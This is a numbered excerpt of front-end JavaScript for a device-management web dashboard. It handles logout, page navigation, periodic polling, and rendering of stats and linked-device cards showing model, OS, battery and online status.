     1→  3000→
     2→  3001→function doLogout(){
     3→  3002→try{api('web/logout',{method:'POST'});}catch(e){}
     4→  3003→TOKEN='';localStorage.removeItem('az_token');
     5→  3004→document.getElementById('app').style.display='none';
     6→  3005→document.getElementById('loginPage').style.display='flex';
     7→  3006→if(POLL_INTERVAL)clearInterval(POLL_INTERVAL);
     8→  3007→}
     9→  3008→
    10→  3009→function showApp(){
    11→  3010→document.getElementById('loginPage').style.display='none';
    12→  3011→document.getElementById('app').style.display='block';
    13→  3012→loadAll();
    14→  3013→POLL_INTERVAL=setInterval(loadAll,5000);
    15→  3014→}
    16→  3015→
    17→  3016→function toggleSidebar(){document.getElementById('sidebar').classList.toggle('open');}
    18→  3017→
    19→  3018→function showPage(name,event){
    20→  3019→document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
    21→  3020→document.getElementById('page-'+name).classList.add('active');
    22→  3021→document.querySelectorAll('.sidebar a').forEach(a=>a.classList.remove('active'));
    23→  3022→if(event&&event.target)event.target.classList.add('active');
    24→  3023→document.getElementById('sidebar').classList.remove('open');
    25→  3024→}
    26→  3025→
    27→  3026→function updateClock(){
    28→  3027→const now=new Date();
    29→  3028→document.getElementById('clock').textContent=now.toLocaleString('ar-SA');
    30→  3029→}
    31→  3030→setInterval(updateClock,1000);updateClock();
    32→  3031→
    33→  3032→function populateDeviceSelects(){
    34→  3033→const html=DEVICES.map(d=>`<option value="${d.id}">${d.name||d.id} (${d.active?'🟢':'🔴'})</option>`).join('');
    35→  3034→['cmdDevice','fileDevice','dataDevice','monDevice','streamDevice'].forEach(id=>{
    36→  3035→const el=document.getElementById(id);if(el)el.innerHTML=html;
    37→  3036→});
    38→  3037→}
    39→  3038→
    40→  3039→async function loadAll(){
    41→  3040→try{const r=await api('web/stats');if(r.ok)renderStats(r.stats);}catch(e){}
    42→  3041→try{const r=await api('web/devices');if(r.ok){DEVICES=r.devices||[];populateDeviceSelects();renderDevices();}}catch(e){}
    43→  3042→try{const r=await api('web/commands');if(r.ok)renderCommandLog(r.commands);}catch(e){}
    44→  3043→loadEvents();
    45→  3044→loadSettings();
    46→  3045→}
    47→  3046→
    48→  3047→function renderStats(s){
    49→  3048→const grid=document.getElementById('statsGrid');
    50→  3049→grid.innerHTML=`
    51→  3050→<div class="stat-card"><div class="label">⏱ Uptime</div><div class="value">${s.uptime_formatted||'-'}</div></div>
    52→  3051→<div class="stat-card"><div class="label">📱 Devices</div><div class="value" style="color:var(--blue)">${s.devices_total}</div><div class="sub">🟢 ${s.devices_online} online</div></div>
    53→  3052→<div class="stat-card"><div class="label">📋 Commands</div><div class="value" style="color:var(--yellow)">${s.total_registered_commands}</div><div class="sub">⏳ ${s.commands_pending} pending</div></div>
    54→  3053→<div class="stat-card"><div class="label">📨 Messages</div><div class="value" style="color:var(--purple)">${s.messages_sent}</div></div>
    55→  3054→<div class="stat-card"><div class="label">📡 API</div><div class="value">${s.api_hits}</div><div class="sub">hits</div></div>
    56→  3055→<div class="stat-card"><div class="label">✅ Completed</div><div class="value" style="color:var(--green)">${s.commands_completed}</div></div>`;
    57→  3056→}
    58→  3057→
    59→  3058→function renderDevices(){
    60→  3059→const el=document.getElementById('deviceList');
    61→  3060→const dash=document.getElementById('dashDevices');
    62→  3061→if(!DEVICES.length){
    63→  3062→el.innerHTML='<div class="empty">No devices linked</div>';
    64→  3063→dash.innerHTML='<div class="empty">No devices</div>';
    65→  3064→return;
    66→  3065→}
    67→  3066→const card=d=>`
    68→  3067→<div class="device-card" onclick="showDeviceDetail('${d.id}')">
    69→  3068→<div class="name">${d.active?'🟢':'🔴'} ${d.name||d.id}</div>
    70→  3069→<div class="meta">Model: ${d.model||'-'} | OS: ${d.os||'-'}</div>
    71→  3070→<div class="meta">Battery: ${d.battery||'-'}% | Last: ${d.last_seen||'-'}</div>
    72→  3071→</div>`;
    73→  3072→el.innerHTML=DEVICES.map(card).join('');
